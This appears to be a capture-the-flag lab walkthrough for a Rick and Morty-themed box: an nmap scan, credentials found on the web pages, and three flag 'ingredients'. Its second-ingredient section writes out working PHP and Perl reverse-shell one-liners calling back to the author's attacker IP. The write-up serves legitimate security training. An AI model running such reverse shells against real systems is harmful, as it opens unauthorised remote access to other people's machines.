## nmap

```sql
└─$ nmap -sC -sV -oN nmap 10.10.48.170
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 12:44 IST
Nmap scan report for 10.10.48.170
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 69:45:03:22:0f:68:6a:d1:31:23:c2:b6:cf:02:62:5a (RSA)
|   256 cc:81:8d:8f:7e:7f:8d:b0:f2:c1:53:5e:6a:70:76:0f (ECDSA)
|_  256 34:da:89:95:ed:0d:b2:dc:1c:16:ce:dd:a8:2a:82:06 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds
```

## web

![[Pasted image 20210607124832.png]]

page source 
![[Pasted image 20210607124859.png]]

![[Pasted image 20210607130008.png]]

robots.txt
![[Pasted image 20210607125235.png]]

but there is not dir with `Wubbalubbadubdub`

/login.php

![[Pasted image 20210607125414.png]]

login creds: `R1ckRul3s:Wubbalubbadubdub`

![[Pasted image 20210607125459.png]]

## 1st ingredient
`less Sup3rS3cretPickl3Ingred.txt`
![[Pasted image 20210607125554.png]]


## 2nd ingredient
lets get a reverse shell

this php shell does ping the box but closes itself
`php -r '$sock=fsockopen("10.17.4.208",9001);exec("/bin/sh -i <&3 >&3 2>&3");'`

![[Pasted image 20210607130441.png]]

same for bash 
but perl workerd


`perl -e 'use Socket;$i="10.17.4.208";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

![[Pasted image 20210607133427.png]]

2nd ingredient

![[Pasted image 20210607134454.png]]

3rd ingredient

![[Pasted image 20210607135035.png]]